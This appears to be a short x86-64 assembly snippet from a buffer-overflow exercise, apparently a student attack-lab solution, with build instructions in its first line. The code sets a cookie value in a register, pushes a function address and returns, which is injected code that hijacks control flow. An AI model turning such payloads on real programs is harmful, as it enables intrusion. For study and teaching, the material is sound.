#! gcc -c s.s -o o.o && objdump -d o.o > d.d && rm o.o
mov $0x59b997fa,%rdi
pushq $0x00000000004017ec
retq

